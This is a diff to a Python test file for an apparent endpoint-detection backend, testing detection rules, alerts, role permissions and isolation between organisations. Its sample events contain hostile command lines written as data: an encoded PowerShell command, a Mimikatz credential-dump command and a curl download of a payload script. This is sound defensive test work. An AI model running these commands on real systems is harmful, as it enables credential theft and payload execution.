@@ -8,6 +8,9 @@ from fastapi.testclient import TestClient
 
 from app.api.dependencies import (
     get_agent_repository,
+    get_alert_repository,
+    get_detection_result_repository,
+    get_detection_rule_repository,
     get_event_repository,
     get_organization_repository,
     get_user_repository,
@@ -21,10 +24,13 @@ from app.core.security import (
 )
 from app.main import app
 from app.models.agent import Agent, AgentStatus, OSType
+from app.models.alert import Alert, AlertStatus
 from app.models.auth import Role, UserStatus
+from app.models.detection import DetectionResult, DetectionRule
 from app.models.event import Event, EventSeverity, EventSource
 from app.models.organization import Organization
 from app.models.user import User
+from app.repositories.detections import builtin_detection_rules
 from app.schemas.events import EventIngestItem
 
 
@@ -34,6 +40,9 @@ class EventTestStore:
         self.organizations: dict[str, Organization] = {}
         self.agents: dict[str, Agent] = {}
         self.events: dict[str, Event] = {}
+        self.rules: dict[str, DetectionRule] = {}
+        self.results: dict[str, DetectionResult] = {}
+        self.alerts: dict[str, Alert] = {}
 
 
 class FakeOrganizationRepository:
@@ -253,6 +262,214 @@ class FakeEventRepository:
         return event
 
 
+class FakeDetectionRuleRepository:
+    def __init__(self, store: EventTestStore) -> None:
+        self.store = store
+
+    async def list_for_organization(self, organization_id: str) -> list[DetectionRule]:
+        custom_rules = [
+            rule for rule in self.store.rules.values() if rule.organization_id == organization_id
+        ]
+        return [*builtin_detection_rules(), *custom_rules]
+
+    async def list_enabled_for_organization(self, organization_id: str) -> list[DetectionRule]:
+        return [rule for rule in await self.list_for_organization(organization_id) if rule.enabled]
+
+    async def find_by_id_for_organization(
+        self,
+        *,
+        rule_id: str,
+        organization_id: str,
+    ) -> DetectionRule | None:
+        builtin = next((rule for rule in builtin_detection_rules() if rule.id == rule_id), None)
+        if builtin is not None:
+            return builtin
+        rule = self.store.rules.get(rule_id)
+        if rule is None or rule.organization_id != organization_id:
+            return None
+        return rule
+
+    async def create(self, *, organization_id: str, rule: Any) -> DetectionRule:
+        now = datetime.now(UTC)
+        detection_rule = DetectionRule(
+            id=f"rule_{uuid4().hex}",
+            organization_id=organization_id,
+            name=rule.name,
+            description=rule.description,
+            enabled=rule.enabled,
+            severity=rule.severity,
+            source=rule.source,
+            event_type=rule.event_type,
+            conditions=rule.conditions,
+            mitre_tactics=rule.mitre_tactics,
+            mitre_techniques=rule.mitre_techniques,
+            tags=rule.tags,
+            created_at=now,
+            updated_at=now,
+        )
+        self.store.rules[detection_rule.id] = detection_rule
+        return detection_rule
+
+    async def update(
+        self,
+        *,
+        rule_id: str,
+        organization_id: str,
+        updates: dict[str, Any],
+    ) -> DetectionRule | None:
+        rule = await self.find_by_id_for_organization(
+            rule_id=rule_id,
+            organization_id=organization_id,
+        )
+        if rule is None or rule.organization_id is None:
+            return None
+        updated = rule.model_copy(update={**updates, "updated_at": datetime.now(UTC)})
+        self.store.rules[rule.id] = updated
+        return updated
+
+    async def set_enabled(
+        self,
+        *,
+        rule_id: str,
+        organization_id: str,
+        enabled: bool,
+    ) -> DetectionRule | None:
+        return await self.update(
+            rule_id=rule_id,
+            organization_id=organization_id,
+            updates={"enabled": enabled},
+        )
+
+
+class FakeDetectionResultRepository:
+    def __init__(self, store: EventTestStore) -> None:
+        self.store = store
+
+    async def create(
+        self,
+        *,
+        event: Event,
+        rule: DetectionRule,
+        matched_fields: dict[str, Any],
+    ) -> DetectionResult:
+        result = DetectionResult(
+            id=f"det_{uuid4().hex}",
+            organization_id=event.organization_id,
+            agent_id=event.agent_id,
+            event_id=event.id,
+            rule_id=rule.id,
+            rule_name=rule.name,
+            severity=rule.severity,
+            title=rule.name,
+            description=rule.description,
+            mitre_tactics=rule.mitre_tactics,
+            mitre_techniques=rule.mitre_techniques,
+            matched_fields=matched_fields,
+            created_at=datetime.now(UTC),
+        )
+        self.store.results[result.id] = result
+        return result
+
+    async def list_by_organization(
+        self,
+        *,
+        organization_id: str,
+        limit: int = 100,
+        skip: int = 0,
+    ) -> list[DetectionResult]:
+        results = [
+            result
+            for result in self.store.results.values()
+            if result.organization_id == organization_id
+        ]
+        results.sort(key=lambda result: result.created_at, reverse=True)
+        return results[skip : skip + limit]
+
+    async def find_by_id_for_organization(
+        self,
+        *,
+        result_id: str,
+        organization_id: str,
+    ) -> DetectionResult | None:
+        result = self.store.results.get(result_id)
+        if result is None or result.organization_id != organization_id:
+            return None
+        return result
+
+
+class FakeAlertRepository:
+    def __init__(self, store: EventTestStore) -> None:
+        self.store = store
+
+    async def create_from_detection_result(
+        self,
+        result: DetectionResult,
+        tags: list[str] | None = None,
+    ) -> Alert:
+        now = datetime.now(UTC)
+        alert = Alert(
+            id=f"alr_{uuid4().hex}",
+            organization_id=result.organization_id,
+            agent_id=result.agent_id,
+            event_id=result.event_id,
+            detection_result_id=result.id,
+            title=result.title,
+            description=result.description,
+            severity=result.severity,
+            status=AlertStatus.OPEN,
+            mitre_tactics=result.mitre_tactics,
+            mitre_techniques=result.mitre_techniques,
+            tags=tags or [],
+            created_at=now,
+            updated_at=now,
+        )
+        self.store.alerts[alert.id] = alert
+        return alert
+
+    async def list_by_organization(
+        self,
+        *,
+        organization_id: str,
+        limit: int = 100,
+        skip: int = 0,
+    ) -> list[Alert]:
+        alerts = [
+            alert
+            for alert in self.store.alerts.values()
+            if alert.organization_id == organization_id
+        ]
+        alerts.sort(key=lambda alert: alert.created_at, reverse=True)
+        return alerts[skip : skip + limit]
+
+    async def find_by_id_for_organization(
+        self,
+        *,
+        alert_id: str,
+        organization_id: str,
+    ) -> Alert | None:
+        alert = self.store.alerts.get(alert_id)
+        if alert is None or alert.organization_id != organization_id:
+            return None
+        return alert
+
+    async def update_status(
+        self,
+        *,
+        alert_id: str,
+        organization_id: str,
+        status: AlertStatus,
+    ) -> Alert | None:
+        alert = await self.find_by_id_for_organization(
+            alert_id=alert_id,
+            organization_id=organization_id,
+        )
+        if alert is None:
+            return None
+        updated = alert.model_copy(update={"status": status, "updated_at": datetime.now(UTC)})
+        self.store.alerts[alert.id] = updated
+        return updated
+
+
 @pytest.fixture(autouse=True)
 def clear_settings_cache() -> Iterator[None]:
     get_settings.cache_clear()
@@ -273,6 +490,13 @@ def client(store: EventTestStore) -> Iterator[TestClient]:
     )
     app.dependency_overrides[get_agent_repository] = lambda: FakeAgentRepository(store)
     app.dependency_overrides[get_event_repository] = lambda: FakeEventRepository(store)
+    app.dependency_overrides[get_detection_rule_repository] = (
+        lambda: FakeDetectionRuleRepository(store)
+    )
+    app.dependency_overrides[get_detection_result_repository] = (
+        lambda: FakeDetectionResultRepository(store)
+    )
+    app.dependency_overrides[get_alert_repository] = lambda: FakeAlertRepository(store)
     with TestClient(app) as test_client:
         yield test_client
     app.dependency_overrides.clear()
@@ -643,3 +867,324 @@ def test_viewer_can_list_read_events(client: TestClient, store: EventTestStore) 
 
     assert list_response.status_code == 200
     assert detail_response.status_code == 200
+
+
+def powershell_event() -> dict[str, Any]:
+    return event_payload(
+        event_type="process_start",
+        severity="info",
+        source="windows",
+        title="PowerShell started",
+        raw_event={"image": "powershell.exe"},
+        normalized_fields={"command_line": "powershell.exe -NoP -enc SQBFAFgA"},
+    )
+
+
+def mimikatz_event() -> dict[str, Any]:
+    return event_payload(
+        event_type="process_start",
+        severity="high",
+        source="windows",
+        title="Suspicious credential tool",
+        raw_event={"image": "mimikatz.exe"},
+        normalized_fields={"command_line": "mimikatz.exe sekurlsa::logonpasswords"},
+    )
+
+
+def custom_rule_payload(**overrides: Any) -> dict[str, Any]:
+    payload: dict[str, Any] = {
+        "name": "Custom Curl Download",
+        "description": "Curl download command observed",
+        "enabled": True,
+        "severity": "medium",
+        "source": "linux",
+        "event_type": "process_start",
+        "conditions": {
+            "all": [
+                {
+                    "field": "normalized_fields.command_line",
+                    "operator": "contains",
+                    "value": "curl",
+                }
+            ]
+        },
+        "mitre_tactics": ["Command and Control"],
+        "mitre_techniques": ["T1105"],
+        "tags": ["custom"],
+    }
+    payload.update(overrides)
+    return payload
+
+
+def test_builtin_rules_are_available_listable(client: TestClient, store: EventTestStore) -> None:
+    _, _, token = seed_principal(store)
+
+    response = client.get(
+        "/api/detections/rules",
+        headers={"Authorization": f"Bearer {token}"},
+    )
+
+    assert response.status_code == 200
+    rules = response.json()["rules"]
+    assert len(rules) >= 10
+    assert "Suspicious PowerShell Encoded Command" in {rule["name"] for rule in rules}
+
+
+def test_ingestion_creates_detection_and_alert_for_powershell(
+    client: TestClient,
+    store: EventTestStore,
+) -> None:
+    organization, _, _ = seed_principal(store)
+    _, api_key = seed_agent(store, organization_id=organization.id)
+
+    body = ingest_events(client, api_key, [powershell_event()])
+
+    assert body["detections_created"] == 1
+    assert body["alerts_created"] == 1
+    assert next(iter(store.results.values())).rule_name == "Suspicious PowerShell Encoded Command"
+    assert next(iter(store.alerts.values())).title == "Suspicious PowerShell Encoded Command"
+
+
+def test_ingestion_creates_detection_and_alert_for_mimikatz(
+    client: TestClient,
+    store: EventTestStore,
+) -> None:
+    organization, _, _ = seed_principal(store)
+    _, api_key = seed_agent(store, organization_id=organization.id)
+
+    body = ingest_events(client, api_key, [mimikatz_event()])
+
+    assert body["detections_created"] == 1
+    assert body["alerts_created"] == 1
+    assert next(iter(store.results.values())).rule_name == "Possible Mimikatz Execution"
+
+
+def test_non_matching_event_creates_no_detection(
+    client: TestClient,
+    store: EventTestStore,
+) -> None:
+    organization, _, _ = seed_principal(store)
+    _, api_key = seed_agent(store, organization_id=organization.id)
+
+    body = ingest_events(client, api_key, [event_payload()])
+
+    assert body["detections_created"] == 0
+    assert body["alerts_created"] == 0
+    assert store.results == {}
+    assert store.alerts == {}
+
+
+def test_invalid_rule_condition_rejected(client: TestClient, store: EventTestStore) -> None:
+    _, _, token = seed_principal(store, role=Role.ANALYST)
+
+    response = client.post(
+        "/api/detections/rules",
+        headers={"Authorization": f"Bearer {token}"},
+        json=custom_rule_payload(
+            conditions={
+                "all": [
+                    {
+                        "field": "normalized_fields.command_line",
+                        "operator": "eval",
+                        "value": "curl",
+                    }
+                ]
+            },
+        ),
+    )
+
+    assert response.status_code == 422
+
+
+def test_viewer_can_list_read_rules_results_alerts(
+    client: TestClient,
+    store: EventTestStore,
+) -> None:
+    organization, _, _ = seed_principal(store)
+    _, viewer_token = create_user(
+        store,
+        organization_id=organization.id,
+        role=Role.VIEWER,
+        email="viewer-detection@example.com",
+    )
+    _, api_key = seed_agent(store, organization_id=organization.id)
+    ingest_events(client, api_key, [powershell_event()])
+    result_id = next(iter(store.results))
+    alert_id = next(iter(store.alerts))
+
+    rules_response = client.get(
+        "/api/detections/rules",
+        headers={"Authorization": f"Bearer {viewer_token}"},
+    )
+    result_response = client.get(
+        f"/api/detections/results/{result_id}",
+        headers={"Authorization": f"Bearer {viewer_token}"},
+    )
+    alert_response = client.get(
+        f"/api/alerts/{alert_id}",
+        headers={"Authorization": f"Bearer {viewer_token}"},
+    )
+
+    assert rules_response.status_code == 200
+    assert result_response.status_code == 200
+    assert alert_response.status_code == 200
+
+
+def test_viewer_cannot_create_update_rules(client: TestClient, store: EventTestStore) -> None:
+    organization, _, _ = seed_principal(store)
+    _, viewer_token = create_user(
+        store,
+        organization_id=organization.id,
+        role=Role.VIEWER,
+        email="viewer-rules@example.com",
+    )
+
+    create_response = client.post(
+        "/api/detections/rules",
+        headers={"Authorization": f"Bearer {viewer_token}"},
+        json=custom_rule_payload(),
+    )
+    update_response = client.patch(
+        "/api/detections/rules/rule_missing",
+        headers={"Authorization": f"Bearer {viewer_token}"},
+        json={"enabled": False},
+    )
+
+    assert create_response.status_code == 403
+    assert update_response.status_code == 403
+
+
+def test_analyst_can_create_custom_rule(client: TestClient, store: EventTestStore) -> None:
+    _, _, token = seed_principal(store, role=Role.ANALYST)
+
+    response = client.post(
+        "/api/detections/rules",
+        headers={"Authorization": f"Bearer {token}"},
+        json=custom_rule_payload(),
+    )
+
+    assert response.status_code == 201
+    assert response.json()["organization_id"] is not None
+    assert response.json()["name"] == "Custom Curl Download"
+
+
+def test_custom_rule_triggers_on_matching_event(client: TestClient, store: EventTestStore) -> None:
+    organization, _, token = seed_principal(store, role=Role.ANALYST)
+    _, api_key = seed_agent(store, organization_id=organization.id)
+    create_response = client.post(
+        "/api/detections/rules",
+        headers={"Authorization": f"Bearer {token}"},
+        json=custom_rule_payload(),
+    )
+    assert create_response.status_code == 201
+
+    body = ingest_events(
+        client,
+        api_key,
+        [
+            event_payload(
+                normalized_fields={"command_line": "curl http://example.test/payload.sh"}
+            )
+        ],
+    )
+
+    assert body["detections_created"] == 1
+    assert next(iter(store.results.values())).rule_name == "Custom Curl Download"
+
+
+def test_disabled_custom_rule_does_not_trigger(
+    client: TestClient,
+    store: EventTestStore,
+) -> None:
+    organization, _, token = seed_principal(store, role=Role.ORG_ADMIN)
+    _, api_key = seed_agent(store, organization_id=organization.id)
+    create_response = client.post(
+        "/api/detections/rules",
+        headers={"Authorization": f"Bearer {token}"},
+        json=custom_rule_payload(),
+    )
+    rule_id = create_response.json()["id"]
+    disable_response = client.post(
+        f"/api/detections/rules/{rule_id}/disable",
+        headers={"Authorization": f"Bearer {token}"},
+    )
+    assert disable_response.status_code == 200
+
+    body = ingest_events(
+        client,
+        api_key,
+        [
+            event_payload(
+                normalized_fields={"command_line": "curl http://example.test/payload.sh"}
+            )
+        ],
+    )
+
+    assert body["detections_created"] == 0
+    assert store.results == {}
+
+
+def test_alert_status_update_works_for_analyst(
+    client: TestClient,
+    store: EventTestStore,
+) -> None:
+    organization, _, token = seed_principal(store, role=Role.ANALYST)
+    _, api_key = seed_agent(store, organization_id=organization.id)
+    ingest_events(client, api_key, [powershell_event()])
+    alert_id = next(iter(store.alerts))
+
+    response = client.patch(
+        f"/api/alerts/{alert_id}/status",
+        headers={"Authorization": f"Bearer {token}"},
+        json={"status": "investigating"},
+    )
+
+    assert response.status_code == 200
+    assert response.json()["status"] == "investigating"
+
+
+def test_cross_org_detection_result_access_blocked(
+    client: TestClient,
+    store: EventTestStore,
+) -> None:
+    org_one, _, _ = seed_principal(store, email="det-one@example.com")
+    _, key_one = seed_agent(store, organization_id=org_one.id)
+    _, _, token_two = seed_principal(store, email="det-two@example.com")
+    ingest_events(client, key_one, [powershell_event()])
+    result_id = next(iter(store.results))
+
+    response = client.get(
+        f"/api/detections/results/{result_id}",
+        headers={"Authorization": f"Bearer {token_two}"},
+    )
+
+    assert response.status_code == 404
+
+
+def test_cross_org_alert_access_blocked(client: TestClient, store: EventTestStore) -> None:
+    org_one, _, _ = seed_principal(store, email="alert-one@example.com")
+    _, key_one = seed_agent(store, organization_id=org_one.id)
+    _, _, token_two = seed_principal(store, email="alert-two@example.com")
+    ingest_events(client, key_one, [powershell_event()])
+    alert_id = next(iter(store.alerts))
+
+    response = client.get(
+        f"/api/alerts/{alert_id}",
+        headers={"Authorization": f"Bearer {token_two}"},
+    )
+
+    assert response.status_code == 404
+
+
+def test_ingestion_response_includes_detection_and_alert_counts(
+    client: TestClient,
+    store: EventTestStore,
+) -> None:
+    organization, _, _ = seed_principal(store)
+    _, api_key = seed_agent(store, organization_id=organization.id)
+
+    body = ingest_events(client, api_key, [powershell_event()])
+
+    assert body["accepted"] == 1
+    assert body["detections_created"] == 1
+    assert body["alerts_created"] == 1
